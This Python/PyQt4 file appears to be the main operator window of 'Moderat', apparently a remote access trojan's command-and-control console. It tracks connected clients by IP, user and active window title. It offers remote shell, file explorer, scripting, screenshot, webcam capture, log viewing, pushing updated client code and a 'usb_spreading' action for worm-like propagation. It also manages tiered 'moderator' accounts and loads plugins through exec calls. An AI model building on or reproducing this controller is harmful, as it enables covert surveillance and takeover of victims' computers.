# -*- coding: utf-8 -*-

import os
import sip
import sys
import time

sip.setapi("QString", 2)
sip.setapi("QVariant", 2)

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from settings import SettingsWindow
from libs.moderat_factory import *
from libs.server_factory import *
from libs.language import Translate
from libs.get_theme import Theme
from libs.moderat.Actions import Actions
from libs.moderat.Modes import Modes
from libs.moderat.Config import Settings
from libs.moderat.Decorators import *
from libs.gui import triggers, shortcuts, rmenu, tables, ui, tray, pagination, loading
from libs.dialogs import message
from libs.filters.filter import Filter
from ui import gui


# Main Window
class MainDialog(QMainWindow, gui.Ui_MainWindow):

    connected = False

    DATA = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'DATA')
    modulesBank = {}
    clients = {}

    def __init__(self, reactor, plugins, plugins_dir, parent=None):
        super(MainDialog, self).__init__(parent)
        self.reactor = reactor
        self.setupUi(self)
        self.settings = Settings(self)

        self.anim = QPropertyAnimation(self, 'windowOpacity')
        self.anim.setDuration(1000)
        self.anim.setStartValue(0)
        self.anim.setEndValue(self.settings.moderatOpacity)
        self.anim.start()

        self.clientsTable.horizontalHeader().setStyleSheet('background: none;')

        # Multi Lang
        self.translate = Translate(self)
        self.MString = lambda _word: self.translate.word(_word)
        self.theme = Theme(self)

        # Init Log Dir
        if not os.path.exists(self.DATA):
            os.makedirs(self.DATA)
        self.assets = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'assets')
        self.flags = os.path.join(self.assets, 'flags')
        self.plugins = plugins
        self.plugins_dir = plugins_dir
        self.directServerRunning = False
        self.filter = Filter(self)
        # Setup Settings
        self.set_config()
        self.pagination = pagination.Pagination(self)
        self.tables = tables.updateClientsTable(self)
        # Init UI
        self.ui = ui.updateUi(self)
        # Init Tray
        self.tray = tray.ModeratTrayIcon(self)
        self.rmenu = rmenu.moderatRightClickMenu(self)
        # Session ID
        self.session_id = None
        # Privileges
        self.privs = 0
        # Checkers
        self.moderators_checker = None
        self.clients_checker = None
        # Create Protocol
        self.create_server_protocol()
        self.create_moderator_protocol()
        # Init Triggers
        triggers.ModeratTriggers(self)
        # Init Shortcuts
        shortcuts.ModeratShortcuts(self)
        # Create Actions Object
        self.action = Actions(self)
        # Create Modes Object
        self.modes = Modes(self)

        self.onlineLoading = loading.Loading(self.clientsTabs)
        self.onlineLoading.hide()
        self.showMaximized()

    def set_config(self):

        self.translate.__init__(self)
        self.theme.__init__(self)
        self.setStyleSheet(self.theme.stylesheet)
        self.setWindowOpacity(self.settings.moderatOpacity/100)
        self.setWindowTitle(self.MString('TITLE'))

        self.menuRemote_Server.setTitle(self.MString('REMOTE_SERVER'))
        self.actionConnect.setText(self.MString('CONNECT'))
        self.actionDisconnect.setText(self.MString('DISCONNECT'))
        self.actionExit.setText(self.MString('EXIT'))
        self.menuLocal_Server.setTitle(self.MString('LOCAL_SERVER'))
        self.actionStartServer.setText(self.MString('START_SERVER'))
        self.actionStopServer.setText(self.MString('STOP_SERVER'))
        self.menuFilter.setTitle(self.MString('FILTERS'))
        self.actionSetupFilters.setText(self.MString('SETUP_FILTERS'))
        self.menuSettings.setTitle(self.MString('SETTINGS_TITLE'))
        self.actionRunSettings.setText(self.MString('RUN_SETTINGS'))

        self.clientsTabs.setTabText(0, self.MString('CLIENTS_TAB_ONLINE'))
        self.clientsTabs.setTabText(1, self.MString('CLIENTS_TAB_DIRECT'))
        self.clientsTabs.setTabText(2, self.MString('CLIENTS_TAB_OFFLINE'))
        self.clientsTabs.setTabText(3, self.MString('CLIENTS_TAB_MODERATORS'))

        # HEADERS
        self.clientsTable.horizontalHeaderItem(0).setText(self.MString('HEADER_IP_ADDRESS'))
        self.clientsTable.horizontalHeaderItem(1).setText(self.MString('HEADER_ID'))
        self.clientsTable.horizontalHeaderItem(2).setText(self.MString('HEADER_USER'))
        self.clientsTable.horizontalHeaderItem(3).setText(self.MString('HEADER_ALIAS'))
        self.clientsTable.horizontalHeaderItem(4).setText(self.MString('HEADER_ACTIVE_WINDOW_TITLE'))

        self.offlineClientsTable.horizontalHeaderItem(0).setText(self.MString('HEADER_MODERATOR'))
        self.offlineClientsTable.horizontalHeaderItem(1).setText(self.MString('HEADER_ID'))
        self.offlineClientsTable.horizontalHeaderItem(2).setText(self.MString('HEADER_ALIAS'))
        self.offlineClientsTable.horizontalHeaderItem(3).setText(self.MString('HEADER_IP_ADDRESS'))
        self.offlineClientsTable.horizontalHeaderItem(4).setText(self.MString('HEADER_LAST_ONLINE'))

        self.moderatorsTable.horizontalHeaderItem(0).setText(self.MString('MODERATORS_HEADER_ID'))
        self.moderatorsTable.horizontalHeaderItem(1).setText(self.MString('MODERATORS_HEADER_ONLINE'))
        self.moderatorsTable.horizontalHeaderItem(2).setText(self.MString('MODERATORS_HEADER_OFFLINE'))
        self.moderatorsTable.horizontalHeaderItem(3).setText(self.MString('MODERATORS_HEADER_PRIVILEGES'))
        self.moderatorsTable.horizontalHeaderItem(4).setText(self.MString('MODERATORS_HEADER_STATUS'))
        self.moderatorsTable.horizontalHeaderItem(5).setText(self.MString('MODERATORS_HEADER_LASTONLINE'))

        self.directClientsTable.horizontalHeaderItem(0).setText(self.MString('HEADER_IP_ADDRESS'))
        self.directClientsTable.horizontalHeaderItem(1).setText(self.MString('HEADER_ID'))
        self.directClientsTable.horizontalHeaderItem(2).setText(self.MString('HEADER_MARK'))
        # END HEADERS

        #self.filterButton.filterButton.setText(self.MString('SIDEBAR_FILTER'))

        # Header Refresh
        self.clientsTable.setColumnHidden(0, not self.settings.headerIpAddress)
        self.clientsTable.setColumnHidden(1, not self.settings.headerClientId)
        self.clientsTable.setColumnHidden(2, not self.settings.headerUser)
        self.clientsTable.setColumnHidden(3, not self.settings.headerAlias)
        self.clientsTable.setColumnHidden(4, not self.settings.headerTitle)
        self.clientsTable.resizeColumnsToContents()
        self.clientsTable.horizontalHeader().setStretchLastSection(True)
        # Offline Header Refresh
        self.offlineClientsTable.setColumnHidden(0, not self.settings.offlineHeaderClientId)
        self.offlineClientsTable.setColumnHidden(1, not self.settings.offlineHeaderAlias)
        self.offlineClientsTable.setColumnHidden(2, not self.settings.offlineHeaderIpAddress)
        self.offlineClientsTable.setColumnHidden(3, not self.settings.offlineHeaderLastOnline)
        self.offlineClientsTable.resizeColumnsToContents()
        self.offlineClientsTable.horizontalHeader().setStretchLastSection(True)
        # Direct Header Refresh
        self.directClientsTable.setColumnHidden(0, not self.settings.directHeaderIpAddress)
        self.directClientsTable.setColumnHidden(1, not self.settings.directHeaderClientId)
        self.directClientsTable.setColumnHidden(2, not self.settings.directHeaderComment)
        self.directClientsTable.resizeColumnsToContents()
        self.directClientsTable.horizontalHeader().setStretchLastSection(True)

        # Menu
        self.viewLogsButton.setHidden(not self.settings.menuLogViewer)
        self.noteButton.setHidden(not self.settings.menuNote)
        self.setAliasButton.setHidden(not self.settings.menuAlias)
        self.updateSourceButton.setHidden(not self.settings.menuUpdate)
        self.shellButton.setHidden(not self.settings.menuShell)
        self.explorerButton.setHidden(not self.settings.menuExplorer)
        self.scriptingButton.setHidden(not self.settings.menuScripting)
        self.screenshotButton.setHidden(not self.settings.menuScreenshot)
        self.webcamButton.setHidden(not self.settings.menuWebcam)
        # Offline Menu
        self.viewOfflineLogsButton.setHidden(not self.settings.offlineMenuLogViewer)
        self.setOfflineAliasButton.setHidden(not self.settings.offlineMenuAlias)
        self.removeClientButton.setHidden(not self.settings.offlineMenuRemove)
        # Direct Menu
        self.directShellButton.setHidden(not self.settings.directMenuShell)
        self.directExplorerButton.setHidden(not self.settings.directMenuExplorer)
        self.directScriptingButton.setHidden(not self.settings.directMenuScripting)
        self.directScreenshotButton.setHidden(not self.settings.directMenuScreenshot)
        self.directWebcamButton.setHidden(not self.settings.directMenuWebcam)

    def show_settings_window(self):
        self.settingsWindow = SettingsWindow(self)
        self.settingsWindow.show()

    def create_server_protocol(self):
        '''
        Create Server Protocol
        :return:
        '''
        self.server = ModeratServerFactory(self)

    def on_server_started(self):
        '''
        On Server Started
        :return:
        '''
        self.directServer = self.reactor.listenTCP(self.settings.directServerPort, self.server)
        self.directServerRunning = True
        self.ui.on_server_started()
        self.tray.info(self.MString('TRAY_SERVER_STARTED'), u'{} - {}'.format(self.MString('TRAY_LISTEN_PORT'),
                                                                              self.settings.directServerPort))

    def on_server_stopped(self):
        '''
        On Server Stopped
        :return:
        '''
        if self.directServerRunning:
            self.directServer.stopListening()
            self.directServerRunning = False
        self.ui.on_server_stopped()
        self.tray.info(self.MString('TRAY_SERVER_STOPPED'))

    def create_moderator_protocol(self):
        self.moderator = SocketModeratorFactory(
            self.on_moderator_connect_success,
            self.on_moderator_connect_fail,
            self.on_moderator_receive)

    # Update Direct Connections Tables
    def update_direct_table(self):
        '''
        Rearrange Direct Clients
        :param clients:
        :return:
        '''
        self.tables.update_direct_clients()

    # Start Connect To Server
    def on_connect_to_server(self):
        '''
        Try Connect To Server
        :return:
        '''
        self.connection = self.reactor.connectTCP(self.settings.serverIpAddress, self.settings.serverPort, self.moderator)

    def on_moderator_connect_success(self):
        '''
        On Moderator Connected To Server
        :return:
        '''
        self.connected = True
        self.action.login()

    def on_moderator_connect_fail(self, reason):
        '''
        On Moderator Disconnected From Server
        :param reason:
        :return:
        '''
        if not type(reason) is bool:
            message.error(self, self.MString('MSGBOX_ERROR'), str(reason.value))
        self.connected = False
        self.action.disconnect()

    def on_moderator_receive(self, data):
        '''
        Data Received From Server
        :param data:
        :return:
        '''
        self.modes.check_mode(data)

    def send_message(self, message, mode, _to='', session_id='', module_id='', p2p=False):
        if p2p:
            if self.directServerRunning:
                self.server.send_msg(_to, message, mode, session_id, module_id)
        else:
            self.moderator.send_msg(message, mode, _to, session_id, module_id)

    def set_alias(self):
        '''
        Set Alias For Client
        :return:
        '''
        self.action.set_alias()

    def remove_client(self):
        '''
        Remove Client
        :return:
        '''
        self.action.remove_client()

    def set_logs_settings(self):
        '''
        Set Client Log Settings
        :return:
        '''
        self.action.set_log_settings()

    @connected_to_server
    def update_source(self):
        '''
        Update Clients Source
        :return: Restart client
        '''
        self.action.update_source()

    def execute_module(self, module):
        '''
        execute module
        :param module:
        :return:
        '''
        self.action.execute_module(module)

    # TODO: TEMP
    def usb_spreading(self):
        self.action.usb_spreading()

    @is_administrator
    def set_moderator(self):
        '''
        Set Moderator For Client
        :return:
        '''
        self.action.administrator_set_moderator()

    @connected_to_server
    @is_administrator
    def get_moderators(self):
        '''
        Get Moderators Information
        :return:
        '''
        self.action.administrator_get_moderators()

    @connected_to_server
    @is_administrator
    def create_moderator(self):
        '''
        Create New Moderator
        :return:
        '''
        self.action.administrator_create_moderator()

    @connected_to_server
    @is_administrator
    def change_moderator_password(self):
        '''
        Change Moderator Password
        :return:
        '''
        self.action.administrator_change_moderator_password()

    @connected_to_server
    @is_administrator
    def change_moderator_privilege(self):
        '''
        Change Moderator Privileges
        :return:
        '''
        self.action.administrator_change_moderator_privilege()

    @connected_to_server
    @is_administrator
    def remove_moderator(self):
        '''
        Remove Moderator
        :return:
        '''
        self.action.administrator_remove_moderator()

    @connected_to_server
    def check_clients(self):
        '''
        Update Clients Information
        :return:
        '''
        self.action.get_clients()

    def send_signal(self, data):
        '''
        Send Received Data To Module
        :param data:
        :return:
        '''
        self.action.signal_received(data)

    def start_p2p(self):
        self.action.send_p2p_start()

    def filter_by_ip_address(self):
        self.action.filter_by_ip_address()

    def filter_by_alias(self):
        self.action.filter_by_alias()

    def filter_by_moderator(self):
        self.action.filter_by_moderator()

    def resizeEvent(self, event):
        self.onlineLoading.resize(self.clientsTabs.size())
        event.accept()

    def closeEvent(self, *args, **kwargs):
        '''
        Moderat Close Event Detected
        :param args:
        :param kwargs:
        :return:
        '''
        self.action.close_moderat()
        os._exit(1)


def get_plugins_values(plugin):
    plugin_name = None
    plugin_description = None
    plugin_type = None
    plugin_source = None
    if plugin.endswith('.py'):
        plugin = plugin[:-3]
        try:
            exec 'from plugins import %s' % plugin
            exec 'plugin_name = %s.plugin_name' % plugin
            exec 'plugin_description = %s.plugin_description' % plugin
            exec 'plugin_type = %s.plugin_type' % plugin
            exec 'plugin_source = %s.plugin_source' % plugin
        except:
            pass
    return plugin_name, plugin_description, plugin_type, plugin_source

# -------------------------------------------------------------------------------
# Run Application
if __name__ == '__main__':
    app = QApplication(sys.argv)

    try:
        import qt4reactor
    except ImportError:
        from twisted.internet import qt4reactor
    qt4reactor.install()

    from twisted.internet import reactor

    # Create and display the splash screen
    splash_pix = QPixmap(os.path.join(os.path.dirname(os.path.realpath(__file__)), 'assets', 'splash.png'))
    splash = QSplashScreen(splash_pix, Qt.WindowStaysOnTopHint)
    # Add Progress Bar
    progressBar = QProgressBar(splash)
    status_label = QLabel(splash)
    status_label.setGeometry(220, 300, 600, 20)
    status_label.setStyleSheet('''
color: #c9f5f7;
    ''')
    status_label.setText('Loading Plugins')
    progressBar.setGeometry(0, 320, 600, 10)
    progressBar.setTextVisible(False)
    progressBar.setStyleSheet('''
QProgressBar:horizontal {
border: none;
background-color: transparent;
text-align: bottom;
color: #c9f5f7;
}
QProgressBar::chunk:horizontal {
background: #3498db;
width: 1px;
margin-top: 8px;
color: #3498db;
}
    ''')
    splash.setMask(splash_pix.mask())
    splash.show()
    # Init Plugins
    status_label.setText('Initializing')
    plugins_dir = os.path.join(os.path.dirname(sys.argv[0]), 'plugins')
    init_plugins_dir = os.listdir(plugins_dir)
    plugins_count = len(init_plugins_dir)
    plugins = {}
    for ind, plug in enumerate(init_plugins_dir):
        if '__init__' in plug or not plug.endswith('py'):
            continue
        status_label.setText('Loading Plugin: ' + plug)
        name, desc, _type, source = get_plugins_values(plug)
        if name and desc and source:
            plugins[name] = {
                'description':  desc,
                'type':         _type,
                'source':       source,
            }
        progressBar.setValue((ind+1)*100/plugins_count)
        app.processEvents()
        time.sleep(0.1)

    moderatWindow = MainDialog(reactor, plugins, plugins_dir)
    splash.finish(moderatWindow)
    moderatWindow.show()

    reactor.run()
